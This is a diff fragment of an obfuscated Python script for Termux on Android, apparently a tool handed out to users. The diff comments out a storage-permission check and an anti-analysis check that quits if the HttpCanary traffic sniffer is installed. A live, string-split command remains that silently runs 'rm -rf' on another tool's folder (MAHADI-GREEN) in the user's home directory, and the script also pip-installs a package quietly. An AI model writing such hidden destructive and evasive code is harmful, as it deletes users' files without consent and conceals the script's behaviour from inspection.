@@ -32,15 +32,15 @@ try:import bs4
 except:wash('p'+'ip ins'+'tall b'+'s4 > /d'+'ev/nu'+'ll')
 try:os.makedirs('/sdcard/TOP')
 except:pass
-try:
-    wash('rm -'+'rf /sd'+'card/.txt');wash('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
-except PermissionError:
-    print(f'{style} Wi'+'thout Sto'+'rage Perm'+'ission You Can'+'not R'+'un My Com'+'mand A'+'llow Te'+'rmux Perm'+'issions ! A'+'nd Run A'+'gain ');wash('termux-setup-storage');wash('clear');exit('[=] Ru'+'n Aga'+'in Th'+'is To'+'ol !!')
-try:
-    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
-    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
-        print('fou'+'nd err'+'or i'+'n yo'+'ur te'+'rmu'+'x');exit()
-except:pass
+#try:
+    #wash('rm -'+'rf /sd'+'card/.txt');wash('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
+#except PermissionError:
+    #print(f'{style} Wi'+'thout Sto'+'rage Perm'+'ission You Can'+'not R'+'un My Com'+'mand A'+'llow Te'+'rmux Perm'+'issions ! A'+'nd Run A'+'gain ');wash('termux-setup-storage');wash('clear');exit('[=] Ru'+'n Aga'+'in Th'+'is To'+'ol !!')
+#try:
+    #fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
+    #if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
+        #print('fou'+'nd err'+'or i'+'n yo'+'ur te'+'rmu'+'x');exit()
+#except:pass
 try:
     files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/M"+"AH"+"AD"+"I-"+"GRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"MA"+"HAD"+"I-"+"GR"+"EE"+"N");exit(f"{style} An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
 except FileNotFoundError:pass
